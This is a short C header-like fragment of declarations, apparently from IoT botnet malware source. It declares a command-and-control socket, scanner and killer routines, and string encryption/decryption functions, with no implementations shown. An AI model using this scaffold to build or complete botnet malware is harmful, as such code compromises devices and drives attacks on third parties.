int C2Sock;
void scanner_kill(void);
void scanner_init(int C2Sock);
void decrypt(char *str);
void enc(char *str);
void killer_init(int sock, int main_pid);
int killer_pid;
int scan_pid;
